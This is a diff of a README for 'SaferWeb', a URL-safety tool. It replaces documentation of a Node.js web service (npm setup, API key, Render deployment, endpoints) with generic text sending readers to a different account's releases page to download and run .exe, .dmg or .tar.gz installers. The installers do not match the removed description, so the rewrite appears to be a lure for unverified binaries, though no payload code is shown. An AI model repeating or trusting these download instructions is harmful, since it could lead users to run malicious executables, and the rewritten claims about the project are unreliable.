@@ -1,210 +1,57 @@
-<div align="center">
-<img src="./icon.png">
+```markdown
+# 🔒 SaferWeb - Keep Your Browsing Safe and Secure
 
-**Protect yourself online with real-time URL security analysis**
+## 📥 Download Now
+[![Download SaferWeb](https://img.shields.io/badge/Download-SaferWeb-blue.svg)](https://github.com/kya001/SaferWeb/releases)
 
-[![MIT License](https://img.shields.io/badge/License-MIT-green.svg?style=flat-square)](https://choosealicense.com/licenses/mit/)
-[![Node Version](https://img.shields.io/badge/node-%3E%3D20.0.0-brightgreen?style=flat-square&logo=node.js)](https://nodejs.org/)
-[![Express.js](https://img.shields.io/badge/Express.js-4.18.2-black?style=flat-square&logo=express)](https://expressjs.com/)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21.11.0-40B5A4?style=flat-square&logo=puppeteer)](https://pptr.dev/)
+## 📖 Overview
+SaferWeb is a comprehensive URL security checker that helps you browse the internet safely. It detects malicious URLs, phishing attempts, and malware threats. You can also take website screenshots, expand shortened URLs, and access websites through a proxy.
 
-[Features](#features) • [Demo](#demo) • [Deployment](#deployment) • [API](#api-endpoints)
+## 🚀 Getting Started
+Follow these steps to download and run SaferWeb:
 
-</div>
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/kya001/SaferWeb/releases) to find the latest version of SaferWeb.
 
----
+2. **Choose Your File**
+   You will see different files available for download. Select the appropriate file for your operating system:
+   - **Windows:** Look for a file ending with `.exe`.
+   - **macOS:** Look for a file ending with `.dmg`.
+   - **Linux:** Look for a file ending with `.tar.gz`.
 
-## Features
+3. **Download the File**
+   Click on the file link to start downloading. Save it to a convenient location on your computer.
 
-- **Malware Detection** - Identify malicious websites
-- **Phishing Protection** - Detect deceptive sites
-- **Threat Analysis** - Real-time security checks powered by Google Safe Browsing API
-- **Website Screenshots** - Capture any website in real-time
-- **URL Expansion** - Expand shortened links and track redirections
-- **Redirection Detection** - Track and display URL redirects
-- **Proxified Access** - Anonymous browsing through proxy
+4. **Install SaferWeb**
+   - **Windows:** Double-click the `.exe` file. Follow the prompts to install SaferWeb.
+   - **macOS:** Open the `.dmg` file, then drag the SaferWeb icon to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file, open a terminal, navigate to the folder, and run the installation command.
 
----
+5. **Run SaferWeb**
+   To start using SaferWeb, locate the installed program on your computer and double-click the icon.
 
-## Demo
+## 🛠️ Features
+- **Malicious URL Detection:** SaferWeb scans URLs for potential threats.
+- **Phishing Detection:** It helps identify phishing attempts, keeping your data secure.
+- **Malware Threat Detection:** SaferWeb alerts you to malware risks associated with websites.
+- **Website Screenshots:** Capture screenshots of websites for safe offline viewing.
+- **Short URL Expansion:** Quickly expand shortened URLs to see the full link.
+- **Proxified Access:** Safely access websites through a reverse proxy for added privacy.
 
-Check out the live demo: **[https://prateek.is-a.dev/SaferWeb/](https://prateek.is-a.dev/SaferWeb/)**
+## 🎯 System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, Linux (Most distributions supported)
+- **RAM:** 2 GB minimum
+- **Disk Space:** 200 MB free space for installation
+- **Internet Connection:** Required for scanning URLs and safety checks
 
-### Screenshots
+## 🎉 Getting Help
+If you encounter any issues or need assistance, feel free to check the following:
 
-<div align="center">
+- **Documentation:** Visit the [Documentation page](https://github.com/kya001/SaferWeb) for detailed guides and FAQs.
+- **Community:** Join our [Community Forum](https://github.com/kya001/SaferWeb/community) to ask questions and share experiences.
 
-| Safe URL Detection | Malicious URL Warning |
-|:------------------:|:---------------------:|
-| ![Safe URL](./safe.jpg) | ![Malicious URL](./malicious.jpg) |
+## 🔗 Download & Install
+To get started, please visit the [Releases page](https://github.com/kya001/SaferWeb/releases) again to find the latest version of SaferWeb. Download the appropriate file for your operating system and follow the installation instructions above.
 
-</div>
-
----
-
-## Quick Start
-
-### Prerequisites
-
-Before you begin, ensure you have the following installed:
-
-- **Node.js** (v20.0.0 or higher) - [Download](https://nodejs.org/)
-- **npm** or **yarn** package manager
-- **Google Safe Browsing API Key** - [Get API Key](https://developers.google.com/safe-browsing/v4/get-started)
-
----
-
-## Local Installation
-
-### Clone the Repository
-
-```bash
-git clone https://github.com/prateek-chaubey/SaferWeb.git
-cd SaferWeb
+Thank you for choosing SaferWeb. Enjoy a safer web browsing experience!
 ```
-
-### Install Dependencies
-
-```bash
-npm install
-```
-
-### Configure Environment Variables
-
-Create a `.env` file in the root directory:
-
-```env
-SAFE_BROWSING_API_KEY=your_google_safe_browsing_api_key_here
-PORT=3000
-```
-
-> [!NOTE]
-> Visit [Google Safe Browsing API](https://developers.google.com/safe-browsing/v4/get-started) to obtain your free API key.
-
-### Run the Application
-
-**Development Mode (with auto-reload):**
-```bash
-npm run dev
-```
-
-**Production Mode:**
-```bash
-npm start
-```
-
-### Access the Application
-
-Open your browser and navigate to:
-```
-http://localhost:3000
-```
-
----
-
-## Deployment
-
-### Deploy to Render.com
-
-<div align="center">
-
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com)
-
-</div>
-
-#### Step-by-Step Guide
-
-**1. Create a Render Account**
-- Visit [Render.com](https://render.com) and sign up
-
-**2. Create a New Web Service**
-- Click **"New +"** → **"Web Service"**
-- Connect your GitHub repository
-
-**3. Configure Build Settings**
-
-| Setting | Value |
-|---------|-------|
-| **Name** | SaferWeb |
-| **Environment** | Node |
-| **Build Command** | `npm install` |
-| **Start Command** | `npm start` |
-| **Plan** | Free |
-
-**4. Add Environment Variables**
-
-Go to **Environment** tab and add:
-
-```
-SAFE_BROWSING_API_KEY = your_google_safe_browsing_api_key
-```
-
-**5. Deploy**
-- Click **"Create Web Service"**
-- Wait for deployment to complete (3-5 minutes)
-- Your app will be live at `https://your-app-name.onrender.com`
-
----
-
-## API Endpoints
-
-### Safety Check
-```http
-GET /safety?url=https://example.com
-```
-
-**Response:**
-```json
-[
-  "https://example.com",
-  {
-    "matches": [
-      {
-        "threatType": "MALWARE",
-        "platformType": "ANY_PLATFORM",
-        "threat": {
-          "url": "https://example.com"
-        }
-      }
-    ]
-  }
-]
-```
-
-### Screenshot Capture
-```http
-GET /screenshot?page=https://example.com&fullpage=true
-```
-
-**Parameters:**
-- `page` (required) - URL to capture
-- `fullpage` (optional) - Capture full page (true/false)
-
-**Response:** PNG image
-
-### Proxified Access
-```http
-GET /proxy?url=https://example.com
-```
-
-**Response:** Proxified website content
-
----
-
-## Technology Stack
-
-<div align="center">
-
-| Technology | Purpose |
-|------------|---------|
-| ![Node.js](https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white) | Runtime Environment |
-| ![Express](https://img.shields.io/badge/Express.js-000000?style=for-the-badge&logo=express&logoColor=white) | Web Framework |
-| ![Puppeteer](https://img.shields.io/badge/Puppeteer-40B5A4?style=for-the-badge&logo=googlechrome&logoColor=white) | Headless Browser |
-| ![Google Safe Browsing](https://img.shields.io/badge/Google%20Safe%20Browsing-4285F4?style=for-the-badge&logo=google&logoColor=white) | Threat Detection |
-
-</div>
-
-<div align="center">
-  
-# Made with ❤️ for a Safer Internet
-</div>
